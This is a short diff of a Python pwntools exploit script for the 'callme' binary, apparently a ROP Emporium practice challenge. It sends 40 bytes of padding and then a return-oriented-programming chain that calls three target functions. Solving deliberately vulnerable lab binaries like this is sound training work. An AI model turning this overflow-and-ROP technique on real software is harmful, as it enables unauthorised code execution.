@@ -1,7 +1,6 @@
 from pwn import *
 
-exe = ELF("./callme_patched")
-libc = ELF("./libcallme.so")
+exe = ELF("./callme")
 
 context.binary = exe
 
@@ -23,7 +22,7 @@ def exploit(r):
     rop.call("callme_two", [VALUE1, VALUE2, VALUE3])
     rop.call("callme_three", [VALUE1, VALUE2, VALUE3])
 
-    r.sendline(b"a" * 0x28 + rop.chain())
+    r.sendlineafter(b"> ", b"a" * 40 + rop.chain())
     
 def main():
     r = conn()
